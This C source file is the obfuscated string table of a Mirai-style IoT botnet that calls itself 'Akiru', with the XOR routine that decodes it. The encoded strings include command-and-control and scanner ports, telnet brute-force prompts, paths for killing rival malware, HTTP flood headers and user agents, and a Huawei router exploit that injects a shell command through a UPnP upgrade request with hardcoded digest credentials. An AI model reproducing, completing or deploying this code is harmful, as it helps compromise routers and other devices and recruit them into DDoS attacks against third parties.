#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeacfbef;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    // scanner and domain shit!!
    
    // 1337
    add_entry(TABLE_CNC_PORT, "\x63\x5F", 2);
    // 11311
    add_entry(TABLE_SCAN_CB_PORT, "\x4A\x49", 2);
    // Akiru Is Here
    add_entry(TABLE_EXEC_SUCCESS, "\x27\x0D\x0F\x14\x13\x46\x2F\x15\x46\x2E\x03\x14\x03\x66", 14);
    add_entry(TABLE_INSTANCE_EXISTS, "\xA1\x83\x86\x86\x83\x84\x8D\xCA\x9A\x98\x8F\x9C\x83\x85\x9F\x99\xCA\x83\x84\x99\x9E\x8B\x84\x89\x8F\xEA", 26);
    // shell
    add_entry(TABLE_SCAN_SHELL, "\x15\x0E\x03\x0A\x0A\x66", 6);
    // enable
    add_entry(TABLE_SCAN_ENABLE, "\x03\x08\x07\x04\x0A\x03\x66", 7);
    // system
    add_entry(TABLE_SCAN_SYSTEM, "\x15\x1F\x15\x12\x03\x0B\x66", 7);
    // sh
    add_entry(TABLE_SCAN_SH, "\x15\x0E\x66", 3);
    // /bin/busybox Akiru
    add_entry(TABLE_SCAN_QUERY, "\x49\x04\x0F\x08\x49\x04\x13\x15\x1F\x04\x09\x1E\x46\x27\x0D\x0F\x14\x13\x66", 19);
    // Akiru: applet not found
    add_entry(TABLE_SCAN_RESP, "\x27\x0D\x0F\x14\x13\x5C\x46\x07\x16\x16\x0A\x03\x12\x46\x08\x09\x12\x46\x00\x09\x13\x08\x02\x66", 24);
    // ncorrect
    add_entry(TABLE_SCAN_NCORRECT, "\x08\x05\x09\x14\x14\x03\x05\x12\x66", 9);
    // /bin/busybox ps
    add_entry(TABLE_SCAN_PS, "\x49\x04\x0F\x08\x49\x04\x13\x15\x1F\x04\x09\x1E\x46\x16\x15\x66", 16);
    // /bin/busybox kill -9 
    add_entry(TABLE_SCAN_KILL_9, "\x49\x04\x0F\x08\x49\x04\x13\x15\x1F\x04\x09\x1E\x46\x0D\x0F\x0A\x0A\x46\x4B\x5F\x66", 22);
    
    // killer shit!!
    
    // /proc/
    add_entry(TABLE_KILLER_PROC, "\x49\x16\x14\x09\x05\x49\x66", 7);
    // /exe
    add_entry(TABLE_KILLER_EXE, "\x49\x03\x1E\x03\x66", 5);
    // /fd
    add_entry(TABLE_KILLER_FD, "\x49\x00\x02\x66", 4);
    // /maps
    add_entry(TABLE_KILLER_MAPS, "\x49\x0B\x07\x16\x15\x66", 6);
    // /proc/net/tcp
    add_entry(TABLE_KILLER_TCP, "\x49\x16\x14\x09\x05\x49\x08\x03\x12\x49\x12\x05\x16\x66", 14);
    // /status
    add_entry(TABLE_KILLER_STATUS, "\x49\x15\x12\x07\x12\x13\x15\x66", 8);
    // .anime
    add_entry(TABLE_KILLER_ANIME, "\x48\x07\x08\x0F\x0B\x03\x66", 7);
    // /proc/net/route
    add_entry(TABLE_MEM_ROUTE, "\x49\x16\x14\x09\x05\x49\x08\x03\x12\x49\x14\x09\x13\x12\x03\x66", 16);
    // "/etc/rc.d/rc.local"
    add_entry(TABLE_MEM_RC, "\x49\x03\x12\x05\x49\x14\x05\x48\x02\x49\x14\x05\x48\x0A\x09\x05\x07\x0A\x66", 19);
    // assword
    add_entry(TABLE_MEM_ASSWORD, "\x07\x15\x15\x11\x09\x14\x02\x66", 8);
    // "dvrHelper" 4
    add_entry(TABLE_MEM_DVRHELP, "\x02\x10\x14\x2E\x03\x0A\x16\x03\x14\x66", 10);
    // "WsGA4@F6F" 5
    add_entry(TABLE_MEM_SHINTO3, "\x31\x15\x21\x27\x52\x26\x20\x50\x20\x66", 10);
    // "ACDB" 6
    add_entry(TABLE_MEM_SHINTO5, "\x27\x25\x22\x24\x66", 5);
    // "AbAd" 7
    add_entry(TABLE_MEM_JOSHO1, "\x27\x04\x27\x02\x66", 5);
    // "iaGv" 8
    add_entry(TABLE_MEM_JOSHO2, "\x0F\x07\x21\x10\x66", 5);
    // "UPX" 9
    add_entry(TABLE_MEM_UPX, "\x33\x36\x3E\x66", 4);
    
    
    // methods shit!!

    // TSource Engine Query
    add_entry(TABLE_ATK_VSE, "\x32\x35\x09\x13\x14\x05\x03\x46\x23\x08\x01\x0F\x08\x03\x46\x37\x13\x03\x14\x1F\x66", 21);
    // /etc/resolv.conf
    add_entry(TABLE_ATK_RESOLVER, "\x49\x03\x12\x05\x49\x14\x03\x15\x09\x0A\x10\x48\x05\x09\x08\x00\x66", 17);
    // nameserver 
    add_entry(TABLE_ATK_NSERV, "\x08\x07\x0B\x03\x15\x03\x14\x10\x03\x14\x66", 12);
    // "HTTP/1.1"
    add_entry(TABLE_ATK_HTTP, "\x2E\x32\x32\x36\x49\x57\x48\x57\x66", 9);
    // "User-Agent:"
    add_entry(TABLE_ATK_USRAGENT, "\x33\x15\x03\x14\x4B\x27\x01\x03\x08\x12\x5C\x66", 12);
    // "Host:"
    add_entry(TABLE_ATK_HOST, "\x2E\x09\x15\x12\x5C\x66", 6);
    // "GET"
    add_entry(TABLE_ATK_GET, "\x21\x23\x32\x66", 4);
    // "POST"
    add_entry(TABLE_ATK_POST, "\x36\x29\x35\x32\x66", 5);
    // "Connection: keep-alive"
    add_entry(TABLE_ATK_KEEP_ALIVE, "\x25\x09\x08\x08\x03\x05\x12\x0F\x09\x08\x5C\x46\x0D\x03\x03\x16\x4B\x07\x0A\x0F\x10\x03\x66", 23);
    // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    add_entry(TABLE_ATK_ACCEPT, "\x27\x05\x05\x03\x16\x12\x5C\x46\x12\x03\x1E\x12\x49\x0E\x12\x0B\x0A\x4A\x07\x16\x16\x0A\x0F\x05\x07\x12\x0F\x09\x08\x49\x1E\x0E\x12\x0B\x0A\x4D\x1E\x0B\x0A\x4A\x07\x16\x16\x0A\x0F\x05\x07\x12\x0F\x09\x08\x49\x1E\x0B\x0A\x5D\x17\x5B\x56\x48\x5F\x4A\x0F\x0B\x07\x01\x03\x49\x11\x03\x04\x16\x4A\x4C\x49\x4C\x5D\x17\x5B\x56\x48\x5E\x66", 83);
    // "Accept-Language: en-US,en;q=0.8"
    add_entry(TABLE_ATK_ACCEPT_LNG, "\x27\x05\x05\x03\x16\x12\x4B\x2A\x07\x08\x01\x13\x07\x01\x03\x5C\x46\x03\x08\x4B\x33\x35\x4A\x03\x08\x5D\x17\x5B\x56\x48\x5E\x66", 32);
    // "Content-Type: application/x-www-form-urlencoded"
    add_entry(TABLE_ATK_CONTENT_TYPE, "\x25\x09\x08\x12\x03\x08\x12\x4B\x32\x1F\x16\x03\x5C\x46\x07\x16\x16\x0A\x0F\x05\x07\x12\x0F\x09\x08\x49\x1E\x4B\x11\x11\x11\x4B\x00\x09\x14\x0B\x4B\x13\x14\x0A\x03\x08\x05\x09\x02\x03\x02\x66", 48);
    // "setCookie('"
    add_entry(TABLE_ATK_SET_COOKIE, "\x15\x03\x12\x25\x09\x09\x0D\x0F\x03\x4E\x41\x66", 12);
    // "refresh:"
    add_entry(TABLE_ATK_REFRESH_HDR, "\x14\x03\x00\x14\x03\x15\x0E\x5C\x66", 9);
    // "location:"
    add_entry(TABLE_ATK_LOCATION_HDR, "\x0A\x09\x05\x07\x12\x0F\x09\x08\x5C\x66", 10);
    // "set-cookie:"
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x15\x03\x12\x4B\x05\x09\x09\x0D\x0F\x03\x5C\x66", 12);
    // "content-length:"
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x05\x09\x08\x12\x03\x08\x12\x4B\x0A\x03\x08\x01\x12\x0E\x5C\x66", 16);
    // "transfer-encoding:"
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x12\x14\x07\x08\x15\x00\x03\x14\x4B\x03\x08\x05\x09\x02\x0F\x08\x01\x5C\x66", 19);
    // "chunked"
    add_entry(TABLE_ATK_CHUNKED, "\x05\x0E\x13\x08\x0D\x03\x02\x66", 8);
    // "keep-alive"
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x0D\x03\x03\x16\x4B\x07\x0A\x0F\x10\x03\x66", 11);
    // "connection:"
    add_entry(TABLE_ATK_CONNECTION_HDR, "\x05\x09\x08\x08\x03\x05\x12\x0F\x09\x08\x5C\x66", 12);
    // "server: dosarrest"
    add_entry(TABLE_ATK_DOSARREST, "\x15\x03\x14\x10\x03\x14\x5C\x46\x02\x09\x15\x07\x14\x14\x03\x15\x12\x66", 18);
    // "server: cloudflare-nginx"
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x15\x03\x14\x10\x03\x14\x5C\x46\x05\x0A\x09\x13\x02\x00\x0A\x07\x14\x03\x4B\x08\x01\x0F\x08\x1E\x66", 25);
    // "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
    add_entry(TABLE_HTTP_ONE, "\x2B\x09\x1C\x0F\x0A\x0A\x07\x49\x53\x48\x56\x46\x4E\x31\x0F\x08\x02\x09\x11\x15\x46\x28\x32\x46\x57\x56\x48\x56\x5D\x46\x31\x0F\x08\x50\x52\x5D\x46\x1E\x50\x52\x4F\x46\x27\x16\x16\x0A\x03\x31\x03\x04\x2D\x0F\x12\x49\x53\x55\x51\x48\x55\x50\x46\x4E\x2D\x2E\x32\x2B\x2A\x4A\x46\x0A\x0F\x0D\x03\x46\x21\x03\x05\x0D\x09\x4F\x46\x25\x0E\x14\x09\x0B\x03\x49\x50\x55\x48\x56\x48\x55\x54\x55\x5F\x48\x5E\x52\x46\x35\x07\x00\x07\x14\x0F\x49\x53\x55\x51\x48\x55\x50\x66", 115);
    // "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
    add_entry(TABLE_HTTP_TWO, "\x2B\x09\x1C\x0F\x0A\x0A\x07\x49\x53\x48\x56\x46\x4E\x31\x0F\x08\x02\x09\x11\x15\x46\x28\x32\x46\x57\x56\x48\x56\x5D\x46\x31\x0F\x08\x50\x52\x5D\x46\x1E\x50\x52\x4F\x46\x27\x16\x16\x0A\x03\x31\x03\x04\x2D\x0F\x12\x49\x53\x55\x51\x48\x55\x50\x46\x4E\x2D\x2E\x32\x2B\x2A\x4A\x46\x0A\x0F\x0D\x03\x46\x21\x03\x05\x0D\x09\x4F\x46\x25\x0E\x14\x09\x0B\x03\x49\x50\x54\x48\x56\x48\x55\x54\x56\x54\x48\x5F\x52\x46\x35\x07\x00\x07\x14\x0F\x49\x53\x55\x51\x48\x55\x50\x66", 115);
    // "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
    add_entry(TABLE_HTTP_THREE, "\x2B\x09\x1C\x0F\x0A\x0A\x07\x49\x53\x48\x56\x46\x4E\x31\x0F\x08\x02\x09\x11\x15\x46\x28\x32\x46\x57\x56\x48\x56\x5D\x46\x31\x0F\x08\x50\x52\x5D\x46\x1E\x50\x52\x5D\x46\x14\x10\x5C\x53\x51\x48\x56\x4F\x46\x21\x03\x05\x0D\x09\x49\x54\x56\x57\x56\x56\x57\x56\x57\x46\x20\x0F\x14\x03\x00\x09\x1E\x49\x53\x51\x48\x56\x66", 79);
    // "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
    add_entry(TABLE_HTTP_FOUR, "\x2B\x09\x1C\x0F\x0A\x0A\x07\x49\x53\x48\x56\x46\x4E\x31\x0F\x08\x02\x09\x11\x15\x46\x28\x32\x46\x50\x48\x57\x5D\x46\x31\x0F\x08\x50\x52\x5D\x46\x1E\x50\x52\x4F\x46\x27\x16\x16\x0A\x03\x31\x03\x04\x2D\x0F\x12\x49\x53\x55\x51\x48\x55\x50\x46\x4E\x2D\x2E\x32\x2B\x2A\x4A\x46\x0A\x0F\x0D\x03\x46\x21\x03\x05\x0D\x09\x4F\x46\x25\x0E\x14\x09\x0B\x03\x49\x50\x55\x48\x56\x48\x55\x54\x55\x5F\x48\x5E\x52\x46\x35\x07\x00\x07\x14\x0F\x49\x53\x55\x51\x48\x55\x50\x66", 114);
    // "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
    add_entry(TABLE_HTTP_FIVE, "\x2B\x09\x1C\x0F\x0A\x0A\x07\x49\x53\x48\x56\x46\x4E\x31\x0F\x08\x02\x09\x11\x15\x46\x28\x32\x46\x50\x48\x57\x5D\x46\x31\x0F\x08\x50\x52\x5D\x46\x1E\x50\x52\x4F\x46\x27\x16\x16\x0A\x03\x31\x03\x04\x2D\x0F\x12\x49\x53\x55\x51\x48\x55\x50\x46\x4E\x2D\x2E\x32\x2B\x2A\x4A\x46\x0A\x0F\x0D\x03\x46\x21\x03\x05\x0D\x09\x4F\x46\x25\x0E\x14\x09\x0B\x03\x49\x50\x54\x48\x56\x48\x55\x54\x56\x54\x48\x5F\x52\x46\x35\x07\x00\x07\x14\x0F\x49\x53\x55\x51\x48\x55\x50\x66", 114);
    // "Python/3.5 aiohttp/0.22.5"
    add_entry(TABLE_HTTP_SIX, "\x36\x1F\x12\x0E\x09\x08\x49\x55\x48\x53\x46\x07\x0F\x09\x0E\x12\x12\x16\x49\x56\x48\x54\x54\x48\x53\x66", 26);
    // "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0"
    add_entry(TABLE_HTTP_SEVEN, "\x2B\x09\x1C\x0F\x0A\x0A\x07\x49\x53\x48\x56\x46\x4E\x2B\x07\x05\x0F\x08\x12\x09\x15\x0E\x5D\x46\x2F\x08\x12\x03\x0A\x46\x2B\x07\x05\x46\x29\x35\x46\x3E\x46\x57\x56\x48\x57\x56\x5D\x46\x14\x10\x5C\x55\x5E\x48\x56\x4F\x46\x21\x03\x05\x0D\x09\x49\x54\x56\x57\x56\x56\x57\x56\x57\x46\x20\x0F\x14\x03\x00\x09\x1E\x49\x55\x5E\x48\x56\x66", 82);
    // "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
    add_entry(TABLE_HTTP_EIGHT, "\x2B\x09\x1C\x0F\x0A\x0A\x07\x49\x53\x48\x56\x46\x4E\x31\x0F\x08\x02\x09\x11\x15\x46\x28\x32\x46\x57\x56\x48\x56\x5D\x46\x31\x0F\x08\x50\x52\x5D\x46\x1E\x50\x52\x4F\x46\x27\x16\x16\x0A\x03\x31\x03\x04\x2D\x0F\x12\x49\x53\x55\x51\x48\x55\x50\x46\x4E\x2D\x2E\x32\x2B\x2A\x4A\x46\x0A\x0F\x0D\x03\x46\x21\x03\x05\x0D\x09\x4F\x46\x25\x0E\x14\x09\x0B\x03\x49\x50\x53\x48\x56\x48\x55\x55\x54\x53\x48\x57\x5E\x57\x46\x35\x07\x00\x07\x14\x0F\x49\x53\x55\x51\x48\x55\x50\x66", 116);
    // "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
    add_entry(TABLE_HTTP_NINE, "\x2B\x09\x1C\x0F\x0A\x0A\x07\x49\x53\x48\x56\x46\x4E\x31\x0F\x08\x02\x09\x11\x15\x46\x28\x32\x46\x57\x56\x48\x56\x5D\x46\x31\x0F\x08\x50\x52\x5D\x46\x1E\x50\x52\x5D\x46\x14\x10\x5C\x53\x5E\x48\x56\x4F\x46\x21\x03\x05\x0D\x09\x49\x54\x56\x57\x56\x56\x57\x56\x57\x46\x20\x0F\x14\x03\x00\x09\x1E\x49\x53\x5E\x48\x56\x66", 79);
    // "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
    add_entry(TABLE_HTTP_TEN, "\x2B\x09\x1C\x0F\x0A\x0A\x07\x49\x53\x48\x56\x46\x4E\x31\x0F\x08\x02\x09\x11\x15\x46\x28\x32\x46\x50\x48\x57\x4F\x46\x27\x16\x16\x0A\x03\x31\x03\x04\x2D\x0F\x12\x49\x53\x55\x51\x48\x55\x50\x46\x4E\x2D\x2E\x32\x2B\x2A\x4A\x46\x0A\x0F\x0D\x03\x46\x21\x03\x05\x0D\x09\x4F\x46\x25\x0E\x14\x09\x0B\x03\x49\x50\x52\x48\x56\x48\x55\x54\x5E\x54\x48\x57\x5E\x50\x46\x35\x07\x00\x07\x14\x0F\x49\x53\x55\x51\x48\x55\x50\x66", 103);

    add_entry(TABLE_SCAN_POST, "\xBA\xA5\xB9\xBE\xCA\xC5\x89\x9E\x98\x86\x9E\xC5\xAE\x8F\x9C\x83\x89\x8F\xBF\x9A\x8D\x98\x8B\x8E\x8F\xB5\xDB\xCA\xA2\xBE\xBE\xBA\xC5\xDB\xC4\xDB\xEA", 37); // POST /ctrlt/DeviceUpgrade_1 HTTP/1.1
    add_entry(TABLE_SCAN_CONTENTLEN, "\xA9\x85\x84\x9E\x8F\x84\x9E\xC7\xA6\x8F\x84\x8D\x9E\x82\xD0\xCA\xDE\xD9\xDA\xEA", 20); // Content-Length: 430
    add_entry(TABLE_SCAN_CONNECTION, "\xA9\x85\x84\x84\x8F\x89\x9E\x83\x85\x84\xD0\xCA\x81\x8F\x8F\x9A\xC7\x8B\x86\x83\x9C\x8F\xEA", 23); // Connection: keep-alive
    add_entry(TABLE_SCAN_ACCEPT, "\xAB\x89\x89\x8F\x9A\x9E\xD0\xCA\xC0\xC5\xC0\xEA", 12); // Accept: */*
    add_entry(TABLE_SCAN_AUTH, "\xAB\x9F\x9E\x82\x85\x98\x83\x90\x8B\x9E\x83\x85\x84\xD0\xCA\xAE\x83\x8D\x8F\x99\x9E\xCA\x9F\x99\x8F\x98\x84\x8B\x87\x8F\xD7\xC8\x8E\x99\x86\x8C\xC7\x89\x85\x84\x8C\x83\x8D\xC8\xC6\xCA\x98\x8F\x8B\x86\x87\xD7\xC8\xA2\x9F\x8B\x9D\x8F\x83\xA2\x85\x87\x8F\xAD\x8B\x9E\x8F\x9D\x8B\x93\xC8\xC6\xCA\x84\x85\x84\x89\x8F\xD7\xC8\xD2\xD2\xDC\xDE\xDF\x89\x8F\x8C\x88\xDB\x8C\xD3\x8F\x8E\x8F\xDA\x8F\xD9\xD9\xDC\x8F\xD9\xDF\xDC\xD3\x8E\xDD\xDF\x8F\x8F\xD9\xDA\xC8\xC6\xCA\x9F\x98\x83\xD7\xC8\xC5\x89\x9E\x98\x86\x9E\xC5\xAE\x8F\x9C\x83\x89\x8F\xBF\x9A\x8D\x98\x8B\x8E\x8F\xB5\xDB\xC8\xC6\xCA\x98\x8F\x99\x9A\x85\x84\x99\x8F\xD7\xC8\xD9\xDC\xDB\xD8\x8C\xD2\xDE\xD9\x8B\xDE\xD8\x8E\x88\xD9\xD2\x8C\xDE\xD2\x8C\xDF\xD3\x8E\xD8\x8B\xD9\xDF\xD3\xDD\x8F\xDB\xD3\x89\xC8\xC6\xCA\x8B\x86\x8D\x85\x98\x83\x9E\x82\x87\xD7\xC8\xA7\xAE\xDF\xC8\xC6\xCA\x9B\x85\x9A\xD7\xC8\x8B\x9F\x9E\x82\xC8\xC6\xCA\x84\x89\xD7\xDA\xDA\xDA\xDA\xDA\xDA\xDA\xDB\xC6\xCA\x89\x84\x85\x84\x89\x8F\xD7\xC8\xD8\xDE\xD2\x8E\xDB\x8B\xD8\xDF\xDC\xDA\xDB\xDA\xDA\xDC\xDC\xD3\xC8\xEA", 258); // Authorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"
    add_entry(TABLE_SCAN_HEADER, "\xD6\xD5\x92\x87\x86\xCA\x9C\x8F\x98\x99\x83\x85\x84\xD7\xC8\xDB\xC4\xDA\xC8\xCA\xD5\xD4\xD6\x99\xD0\xAF\x84\x9C\x8F\x86\x85\x9A\x8F\xCA\x92\x87\x86\x84\x99\xD0\x99\xD7\xC8\x82\x9E\x9E\x9A\xD0\xC5\xC5\x99\x89\x82\x8F\x87\x8B\x99\xC4\x92\x87\x86\x99\x85\x8B\x9A\xC4\x85\x98\x8D\xC5\x99\x85\x8B\x9A\xC5\x8F\x84\x9C\x8F\x86\x85\x9A\x8F\xC5\xC8\xCA\x99\xD0\x8F\x84\x89\x85\x8E\x83\x84\x8D\xB9\x9E\x93\x86\x8F\xD7\xC8\x82\x9E\x9E\x9A\xD0\xC5\xC5\x99\x89\x82\x8F\x87\x8B\x99\xC4\x92\x87\x86\x99\x85\x8B\x9A\xC4\x85\x98\x8D\xC5\x99\x85\x8B\x9A\xC5\x8F\x84\x89\x85\x8E\x83\x84\x8D\xC5\xC8\xD4\xD6\x99\xD0\xA8\x85\x8E\x93\xD4\xD6\x9F\xD0\xBF\x9A\x8D\x98\x8B\x8E\x8F\xCA\x92\x87\x86\x84\x99\xD0\x9F\xD7\xC8\x9F\x98\x84\xD0\x99\x89\x82\x8F\x87\x8B\x99\xC7\x9F\x9A\x84\x9A\xC7\x85\x98\x8D\xD0\x99\x8F\x98\x9C\x83\x89\x8F\xD0\xBD\xAB\xA4\xBA\xBA\xBA\xA9\x85\x84\x84\x8F\x89\x9E\x83\x85\x84\xD0\xDB\xC8\xD4\xD6\xA4\x8F\x9D\xB9\x9E\x8B\x9E\x9F\x99\xBF\xB8\xA6\xD4\xEA", 238); // <?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>
    add_entry(TABLE_SCAN_HEADER2, "\xD6\xC5\xA4\x8F\x9D\xB9\x9E\x8B\x9E\x9F\x99\xBF\xB8\xA6\xD4\xD6\xA4\x8F\x9D\xAE\x85\x9D\x84\x86\x85\x8B\x8E\xBF\xB8\xA6\xD4\xCE\xC2\x8F\x89\x82\x85\xCA\xA2\xBF\xAB\xBD\xAF\xA3\xBF\xBA\xA4\xBA\xC3\xD6\xC5\xA4\x8F\x9D\xAE\x85\x9D\x84\x86\x85\x8B\x8E\xBF\xB8\xA6\xD4\xD6\xC5\x9F\xD0\xBF\x9A\x8D\x98\x8B\x8E\x8F\xD4\xD6\xC5\x99\xD0\xA8\x85\x8E\x93\xD4\xD6\xC5\x99\xD0\xAF\x84\x9C\x8F\x86\x85\x9A\x8F\xD4\xEA", 101); // </NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
    // strings encryption shit!!

    // /dev/watchdog
    add_entry(TABLE_MISC_WATCHDOG, "\x49\x02\x03\x10\x49\x11\x07\x12\x05\x0E\x02\x09\x01\x66", 14);
    // /dev/misc/watchdog
    add_entry(TABLE_MISC_WATCHDOG2, "\x49\x02\x03\x10\x49\x0B\x0F\x15\x05\x49\x11\x07\x12\x05\x0E\x02\x09\x01\x66", 19);
    // assword
    add_entry(TABLE_SCAN_ASSWORD, "\x07\x15\x15\x11\x09\x14\x02\x66", 8);
    // ogin
    add_entry(TABLE_SCAN_OGIN, "\x09\x01\x0F\x08\x66", 5);
    // enter
    add_entry(TABLE_SCAN_ENTER, "\x03\x08\x12\x03\x14\x66", 6);
    // yd432nhx6hyp98s4yty7zp
    add_entry(TABLE_MISC_RAND, "\x1F\x02\x52\x55\x54\x08\x0E\x1E\x50\x0E\x1F\x16\x5F\x5E\x15\x52\x1F\x12\x1F\x51\x1C\x16\x66", 23);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}

